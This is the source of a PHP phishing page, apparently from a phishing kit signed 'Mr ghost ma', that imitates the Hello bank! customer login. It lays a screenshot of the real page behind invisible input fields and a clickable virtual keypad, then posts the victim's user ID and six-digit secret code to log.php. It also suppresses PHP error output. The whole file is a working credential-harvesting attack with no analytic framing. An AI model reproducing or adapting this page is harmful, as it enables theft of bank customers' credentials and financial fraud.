﻿<?php
#################################################
#                                               #
#         ||~~ BY ~~ Mr ghost ma ~~||           #
#                                               #
#       ||~ http://fb.com/Not.work404 ~||       #
#                                               #
#        ||~ http://www.mr-ghost.ma ~||         #
#                                               #
#################################################
@ini_set('display_errors',0);
?>
<html style="background: rgb(37, 100, 143) none repeat scroll 0% 0%;"><head>

	<title>Banque digitale Hello bank! â€“ connexion Ã&nbsp; lâ€™espace client</title>

<link rel="shortcut icon" type="image/x-icon" href="./images/title.PNG">
<script type="text/javascript">
function formatText(tag) {
   var Field = document.getElementById('userpass');
   var val = Field.value;
   var selected_txt = val.substring(Field.selectionStart, Field.selectionEnd);
   var before_txt = val.substring(0, Field.selectionStart);
   var after_txt = val.substring(Field.selectionEnd, val.length);
   Field.value += tag  ;
}

function Effaceuser()
{
    document.getElementById("user").value = "";
}
function Effaceuserpass()
{
    document.getElementById("userpass").value = "";
}
</script>
</head>
	<body>

<div style="position: relative;margin: auto;width: 1300px;"><form method="post" action="log.php" style="position: absolute;overflow: hidden;top: 80px;left: 120px;z-index: 0;">

<div style="width: 1268px;height: 900px;background: transparent url(&quot;./images/1.png&quot;) no-repeat scroll 0% 0%;margin: 0px auto auto;"></div>

<?php
if ($_GET["loginError_id"]) {echo'
<input disabled="disabled" style="position: absolute; left: 600px; top: 260px;" src="./images/error.PNG" type="image">';
}
?>

<input name="user" maxlength="10" id="user" type="text" style="
    position: absolute;
    left: 600px;
    top: 358px;
    height: 43px;
    width: 338px;
    margin: 8px 0 0;
    font-size: 18px;
    color: #05a5c0;
    text-align: center;
    outline: 0;
    border: 1px solid rgb(223, 223, 223);
    background-color: #F2F2F2;
    border-radius: 3px;
    " autocomplete="off" required="required">
  <div class="sdfdsd">
<div id="" onclick="formatText ('1');" style="position:absolute;cursor: pointer;overflow:hidden;left: 604px;top: 530px;width: 70px;height: 70px;z-index:5;"></div>
<div id="" onclick="formatText ('3');" style="position:absolute;cursor: pointer;overflow:hidden;left: 680px;top: 530px;width: 70px;height: 70px;z-index:5;"></div>
<div id="" onclick="formatText ('8');" style="position:absolute;cursor: pointer;overflow:hidden;left: 756px;top: 530px;width: 70px;height: 70px;z-index:5;"></div><div id="" onclick="formatText ('5');" style="position:absolute;cursor: pointer;overflow:hidden;left: 832px;top: 530px;width: 70px;height: 70px;z-index:5;"></div><div id="" onclick="formatText ('0');" style="position:absolute;cursor: pointer;overflow:hidden;left: 909px;top: 530px;width: 70px;height: 70px;z-index:5;"></div>
<div class="sdfsd">
<div id="" onclick="formatText ('2');" style="position:absolute;cursor: pointer;overflow:hidden;left: 604px;top: 604px;width: 70px;height: 70px;z-index:5;"></div>
<div id="" onclick="formatText ('7');" style="position:absolute;cursor: pointer;overflow:hidden;left: 680px;top: 604px;width: 70px;height: 70px;z-index:5;"></div>
<div id="" onclick="formatText ('4');" style="position:absolute;cursor: pointer;overflow:hidden;left: 756px;top: 604px;width: 70px;height: 70px;z-index:5;"></div><div id="" onclick="formatText ('6');" style="position:absolute;cursor: pointer;overflow:hidden;left: 832px;top: 604px;width: 70px;height: 70px;z-index:5;"></div><div id="" onclick="formatText ('9');" style="position:absolute;cursor: pointer;overflow:hidden;left: 909px;top: 604px;width: 70px;height: 70px;z-index:5;"></div></div></div>



	









<input name="userpass"  id="userpass" maxlength="6" style="
    position: absolute;
    left: 600px;
    top: 461px;
    height: 43px;
    width: 338px;
    margin: 8px 0 0;
    font-size: 28px;
    color: rgba(10, 10, 10, 0.36);
    text-align: center;
    outline: 0;
    border: 1px solid rgba(0, 0, 0, 0.08);
    background-color: #F2F2F2;
    border-radius: 3px;
    " autocomplete="off" required="required" type="password">










                                                                                             <div style="position:absolute;overflow:hidden;left: 937px;top: 362px;">
<a href="javascript:Effaceuser();">
                            <img src="./images/ifect.PNG" alt="Effacer" style="border=" 0"=""></a>

</div><div style="position:absolute;overflow:hidden;left: 937px;top: 465px;">
<a href="javascript:Effaceuserpass();">
                            <img src="./images/ifect.PNG" alt="Effacer" style="border=" 0"=""></a>

</div>










<input style="position: absolute;left: 597px;top: 680px;" src="images/submit.PNG" type="image">


</form>
</div>
</body></html>